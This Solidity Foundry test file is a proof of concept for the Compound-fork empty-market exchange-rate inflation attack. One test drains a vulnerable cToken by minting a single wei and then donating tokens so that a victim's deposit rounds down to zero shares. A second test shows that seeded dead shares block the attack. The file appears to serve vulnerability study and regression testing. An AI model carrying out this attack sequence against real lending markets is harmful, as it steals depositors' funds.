// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {IERC20} from "../src/ctoken/CToken.sol";
import {VulnerableCToken, SafeCToken} from "../src/ctoken/CToken.sol";

/// PoC for the Compound-fork empty-market exchange-rate inflation (Hundred/Sonne/Onyx, ~$7M+).
///   forge test --match-contract CTokenInflation -vvv
///
/// Invariant (SC07): exchangeRate = cash/totalSupply cannot be moved by a direct donation
/// into an empty/tiny market, so a later depositor's mint isn't siphoned. Vulnerable cToken
/// breaks it; seeding dead shares + rejecting zero-mints holds.
///
/// See docs/exploits/ctoken-empty-market-exchange-rate-2023-04.md
contract CTokenInflationTest is Test {
    MockERC20 token;
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    function setUp() public {
        token = new MockERC20();
        token.mint(attacker, 100e18);
        token.mint(victim, 100e18);
    }

    function test_vulnerableCToken_isDrained() public {
        VulnerableCToken ct = new VulnerableCToken(IERC20(address(token)));
        uint256 attackerStart = token.balanceOf(attacker);
        uint256 donation = 5e18;
        uint256 victimDeposit = 4e18; // < donation -> rounds down to ZERO cTokens

        // 1) Attacker seeds the empty market with a single cToken (1 wei underlying).
        vm.startPrank(attacker);
        token.approve(address(ct), type(uint256).max);
        ct.mint(1); // totalSupply == 1, all held by attacker
        // 2) Attacker donates underlying directly, inflating exchangeRate = cash/supply.
        token.transfer(address(ct), donation);
        vm.stopPrank();

        // 3) Victim deposits less than one (inflated) share -> round-down mints 0 cTokens,
        //    but the underlying is still pulled into the pool.
        vm.startPrank(victim);
        token.approve(address(ct), type(uint256).max);
        uint256 vShares = ct.mint(victimDeposit);
        vm.stopPrank();
        console2.log("victim cTokens minted:", vShares);
        assertEq(vShares, 0, "victim's deposit rounded to zero shares");

        // 4) Attacker still owns 100% of supply; redeeming it sweeps the victim's deposit too.
        uint256 attackerShares = ct.balanceOf(attacker);
        vm.prank(attacker);
        ct.redeem(attackerShares);

        uint256 attackerEnd = token.balanceOf(attacker);
        console2.log("attacker profit:", attackerEnd - attackerStart);
        assertGt(attackerEnd, attackerStart, "attacker profited from the donation inflation");
    }

    function test_safeCToken_resistsInflation() public {
        uint256 seed = 5e18;
        SafeCToken ct = new SafeCToken(IERC20(address(token)), seed);
        token.mint(address(ct), seed); // back the seeded dead shares with real cash

        uint256 attackerStart = token.balanceOf(attacker);

        // Attacker tries the same play: mint, then donate to inflate the rate.
        vm.startPrank(attacker);
        token.approve(address(ct), type(uint256).max);
        ct.mint(1e18);
        token.transfer(address(ct), 5e18); // donation is diluted by the dead-share seed
        vm.stopPrank();

        // Victim deposits and immediately redeems: with a seeded market the round-down is
        // negligible, so the victim gets back ~their deposit.
        vm.startPrank(victim);
        token.approve(address(ct), type(uint256).max);
        uint256 vShares = ct.mint(4e18);
        assertGt(vShares, 0, "victim receives real shares (no zero-mint)");
        ct.redeem(vShares);
        uint256 victimOut = token.balanceOf(victim);
        vm.stopPrank();

        uint256 attackerShares = ct.balanceOf(attacker);
        vm.prank(attacker);
        ct.redeem(attackerShares);

        assertLe(token.balanceOf(attacker), attackerStart, "attacker cannot profit");
        assertGe(victimOut, 100e18 - 0.01e18, "victim redeems ~their deposit (no siphon)");
    }
}
